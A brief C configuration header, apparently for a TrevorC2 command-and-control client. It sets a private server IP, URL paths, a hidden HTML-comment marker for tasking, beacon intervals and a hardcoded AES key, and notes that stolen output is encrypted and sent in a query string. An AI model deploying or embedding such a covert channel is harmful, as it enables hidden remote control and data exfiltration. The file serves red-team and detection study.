#ifndef TC2_CONFIG_H_
#define TC2_CONFIG_H_

//#define SERVER_HOSTNAME "127.0.0.1"
#define SERVER_HOSTNAME "192.168.1.175"
#define ROOT_PATH_QUERY "/"
#define SITE_PATH_QUERY "/images"
#define QUERY_STRING "guid="
#define STUB "<!-- oldcss="
#define ENDSTUB "-->"
#define time_interval1 2
#define time_interval2 8
#define time_factor 1000
#define COOKIE_VALUE "sessionid="

#define AES_KEY "Tr3v0rC2R0x@nd1s@w350m3#TrevorForget"

/* NOTES:
 * SITE_URL + SITE_PATH_QUERY + "?" + QUERY_STRING + OUTDATA
 *   - Location of outbound data. Padded, encrypted, then base64 encoded.
 * SITE_URL + ROOT_PATH_QUERY
 *   - Location for tasking data. Base64 decode, and decrypt + remove padding.
*/

#endif
